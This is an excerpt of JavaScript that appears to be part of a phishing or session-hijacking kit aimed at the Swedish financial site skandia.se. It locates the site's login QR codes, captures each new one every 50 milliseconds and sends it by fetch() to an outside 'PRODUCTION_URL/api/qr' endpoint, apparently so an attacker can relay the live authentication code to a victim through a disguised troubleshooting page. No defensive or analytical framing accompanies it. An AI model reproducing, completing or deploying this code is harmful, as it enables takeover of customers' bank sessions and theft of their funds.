...
// Skandia configuration
const SKANDIA_CONFIG = {
    identifier: {
        urls: ['skandia.se'],
        titles: ['skandia'],
        domains: ['skandia']
    ...
    selectors: {
        qrContainer: '.qr-code-container, [class*="qr-code"], [class*="qrcode"]',
        qrImage: 'img[alt*="QR-kod"], img[alt*="QR kod"], img[alt*="QR-code"], img[alt*="QR code"]',
        qrCanvas: 'canvas[title*="QR"], canvas[id*="qr"], canvas[class*="qr"]',
        qrSvg: '#qr-container svg, .qr svg, #qr svg, svg[data-test-id="qr-component"], svg[class*="qr"], svg[class*="qrcode"]'
    },
    captureInterval: 50,
    captureThrottle: 100,
    lastCapture: 0,
    lastHash: null,
    displayUrl: `${PRODUCTION_URL}/Skandiafelsokningskundidentifieringkund98721311`
};
        ...
        if (element.tagName === 'svg') {
            ...
            img.onload = function() {
                try {
                    ...
                    if (hash === SKANDIA_CONFIG.lastHash) {
                        console.log('Same QR code as last capture');
                        return;
                    }
                    
                    console.log('Capturing new QR code');
                    SKANDIA_CONFIG.lastHash = hash;
                    SKANDIA_CONFIG.lastCapture = Date.now();
                    ...
                    fetch(`${PRODUCTION_URL}/api/qr`, {
                        ...
                        body: JSON.stringify({ 
                            ...
                            displayUrl: SKANDIA_CONFIG.displayUrl
                        })
                    })
...
function findQRCodes() {
    const svgs = document.querySelectorAll(SKANDIA_CONFIG.selectors.qrSvg);
    const qrContainers = document.querySelectorAll(SKANDIA_CONFIG.selectors.qrContainer);
...
function autoCapture() {
    const now = Date.now();
    if (now - SKANDIA_CONFIG.lastCapture < SKANDIA_CONFIG.captureThrottle) {
        return;
    }
...
function startMonitoring() {
    ...
    captureInterval = setInterval(autoCapture, SKANDIA_CONFIG.captureInterval);
